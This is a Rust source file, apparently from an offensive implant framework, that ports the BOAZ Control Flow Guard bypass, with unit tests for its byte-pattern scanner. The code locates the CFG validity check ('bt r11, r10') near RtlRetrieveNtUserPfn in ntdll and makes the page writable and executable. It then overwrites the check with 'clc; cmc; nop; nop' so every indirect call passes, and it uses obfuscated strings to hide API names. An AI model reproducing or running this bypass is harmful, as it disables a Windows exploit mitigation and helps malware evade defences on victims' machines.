//! CFG (Control Flow Guard) bypass (BOAZ cfg_patch port).
//!
//! Locates `LdrpDispatchUserCallTarget` near `RtlRetrieveNtUserPfn` by
//! scanning for the `bt r11,r10` CFG check pattern, then replaces it with
//! `clc; cmc` so the check always reports the target as a valid CFG target.

use core::ffi::c_void;

use crate::types::PAGE_EXECUTE_READWRITE;
use malefic_os_win::kit::binding::{
    MGetCurrentProcess, MGetProcAddress, MLoadLibraryA, MNtFlushInstructionCache, MVirtualProtect,
};

/// Get ntdll base address from the loaded module list.
unsafe fn get_ntdll_base() -> *mut u8 {
    let _obf_ntdll_dll = obf_cstr!(b"ntdll.dll\0");
    MLoadLibraryA(_obf_ntdll_dll.as_ptr()) as *mut u8
}

/// Scan `[start, start + range)` for `pattern`, returning the offset.
unsafe fn get_pattern(start: *const u8, range: usize, pattern: &[u8]) -> Option<usize> {
    let n = pattern.len();
    if range < n {
        return None;
    }
    for off in 0..=(range - n) {
        let slice = core::slice::from_raw_parts(start.add(off), n);
        if slice == pattern {
            return Some(off);
        }
    }
    None
}

/// Patch Control Flow Guard by neutering `LdrpDispatchUserCallTarget`.
///
/// Strategy (mirrors the C original):
/// 1. Find `RtlRetrieveNtUserPfn` in ntdll exports.
/// 2. Scan ±0x1000 bytes around it for the `bt r11, r10` encoding
///    (4D 0F A3 CA), which is the CFG validity check inside
///    `LdrpDispatchUserCallTarget`.
/// 3. Replace those 4 bytes with `clc; cmc; nop; nop` (F8 F5 90 90)
///    so the carry flag is always cleared then toggled, making every
///    indirect call appear valid to CFG.
pub fn patch_cfg() {
    unsafe {
        let ntdll = get_ntdll_base();
        if ntdll.is_null() {
            return;
        }

        // Resolve RtlRetrieveNtUserPfn as our scan anchor
        let _obf_rtlretrieventuserpfn = obf_cstr!(b"RtlRetrieveNtUserPfn\0");
        let anchor_raw =
            MGetProcAddress(ntdll as *const c_void, _obf_rtlretrieventuserpfn.as_ptr());
        let anchor = if anchor_raw.is_null() {
            // Fall back: scan the whole module (expensive but works)
            ntdll
        } else {
            // Scan ±0x1000 bytes around the anchor
            anchor_raw as *mut u8
        };

        // Scan range: start a little before the anchor
        let scan_start = anchor.sub(0x1000);
        let scan_range = 0x2000usize;

        // bt r11, r10  =  4D 0F A3 CA
        let bt_pattern: &[u8] = &[0x4D, 0x0F, 0xA3, 0xCA];
        // Replacement: clc (F8) + cmc (F5) + nop (90) + nop (90)
        let patch: [u8; 4] = [0xF8, 0xF5, 0x90, 0x90];

        if let Some(off) = get_pattern(scan_start, scan_range, bt_pattern) {
            let target = scan_start.add(off);
            let mut old_prot: u32 = 0;
            if MVirtualProtect(
                target as *mut c_void,
                patch.len(),
                PAGE_EXECUTE_READWRITE,
                &mut old_prot,
            ) {
                core::ptr::copy_nonoverlapping(patch.as_ptr(), target, patch.len());
                MVirtualProtect(target as *mut c_void, patch.len(), old_prot, &mut old_prot);
                MNtFlushInstructionCache(MGetCurrentProcess(), target as *mut c_void, patch.len());
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_pattern_found_at_start() {
        let data = vec![0x4D, 0x0F, 0xA3, 0xCA, 0x90, 0x90];
        unsafe {
            let result = get_pattern(data.as_ptr(), data.len(), &[0x4D, 0x0F, 0xA3, 0xCA]);
            assert_eq!(result, Some(0));
        }
    }

    #[test]
    fn test_get_pattern_found_in_middle() {
        let data = vec![0x90, 0x90, 0x4D, 0x0F, 0xA3, 0xCA, 0x90];
        unsafe {
            let result = get_pattern(data.as_ptr(), data.len(), &[0x4D, 0x0F, 0xA3, 0xCA]);
            assert_eq!(result, Some(2));
        }
    }

    #[test]
    fn test_get_pattern_found_at_end() {
        let data = vec![0x90, 0x90, 0x4D, 0x0F, 0xA3, 0xCA];
        unsafe {
            let result = get_pattern(data.as_ptr(), data.len(), &[0x4D, 0x0F, 0xA3, 0xCA]);
            assert_eq!(result, Some(2));
        }
    }

    #[test]
    fn test_get_pattern_not_found() {
        let data = vec![0x90, 0x90, 0x90, 0x90, 0x90, 0x90];
        unsafe {
            let result = get_pattern(data.as_ptr(), data.len(), &[0x4D, 0x0F, 0xA3, 0xCA]);
            assert_eq!(result, None);
        }
    }

    #[test]
    fn test_get_pattern_range_too_small() {
        let data = vec![0x4D, 0x0F];
        unsafe {
            let result = get_pattern(data.as_ptr(), data.len(), &[0x4D, 0x0F, 0xA3, 0xCA]);
            assert_eq!(result, None);
        }
    }

    #[test]
    fn test_get_pattern_single_byte() {
        let data = vec![0x00, 0x01, 0xCC, 0x03];
        unsafe {
            let result = get_pattern(data.as_ptr(), data.len(), &[0xCC]);
            assert_eq!(result, Some(2));
        }
    }

    #[test]
    fn test_get_pattern_first_occurrence() {
        // Should return the FIRST match
        let data = vec![0xAA, 0xBB, 0xAA, 0xBB];
        unsafe {
            let result = get_pattern(data.as_ptr(), data.len(), &[0xAA, 0xBB]);
            assert_eq!(result, Some(0));
        }
    }
}
